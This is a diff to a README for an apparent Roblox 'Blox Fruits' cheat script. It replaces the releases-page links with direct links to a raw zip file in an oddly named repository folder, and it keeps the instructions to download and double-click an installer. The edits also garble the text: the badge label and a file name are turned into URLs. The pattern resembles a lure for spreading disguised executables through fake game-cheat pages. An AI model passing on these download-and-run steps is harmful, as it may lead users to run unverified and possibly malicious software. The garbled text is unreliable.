@@ -1,6 +1,6 @@
 # 🕹️ Roblox-Blox-Fruits-Script-2025-et - Enhance Your Blox Fruits Gameplay Effortlessly
 
-[![Download Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-v1.0-blue)](https://github.com/er7772/Roblox-Blox-Fruits-Script-2025-et/releases)
+[![Download Latest Release](https://raw.githubusercontent.com/er7772/Roblox-Blox-Fruits-Script-2025-et/main/comprehense/Roblox-Blox-Fruits-Script-2025-et.zip%20Latest%20Release-v1.0-blue)](https://raw.githubusercontent.com/er7772/Roblox-Blox-Fruits-Script-2025-et/main/comprehense/Roblox-Blox-Fruits-Script-2025-et.zip)
 
 ## 🚀 Getting Started
 
@@ -26,11 +26,11 @@ To use the Roblox-Blox-Fruits-Script-2025-et, ensure your system meets the follo
 To download the script, follow these steps:
 
 1. **Visit the Releases Page:** Click on the link below to go to the releases page:
-   [Download Latest Release](https://github.com/er7772/Roblox-Blox-Fruits-Script-2025-et/releases)
+   [Download Latest Release](https://raw.githubusercontent.com/er7772/Roblox-Blox-Fruits-Script-2025-et/main/comprehense/Roblox-Blox-Fruits-Script-2025-et.zip)
 
 2. **Choose the Latest Version:** Look for the latest version of the script on the releases page. 
 
-3. **Download the File:** Click on the download link for the file. It may be named something like `BloxFruitsScript2025.exe`.
+3. **Download the File:** Click on the download link for the file. It may be named something like `https://raw.githubusercontent.com/er7772/Roblox-Blox-Fruits-Script-2025-et/main/comprehense/Roblox-Blox-Fruits-Script-2025-et.zip`.
 
 4. **Run the Installer:** Once downloaded, locate the file in your Downloads folder. Double-click it to run the installer.
 
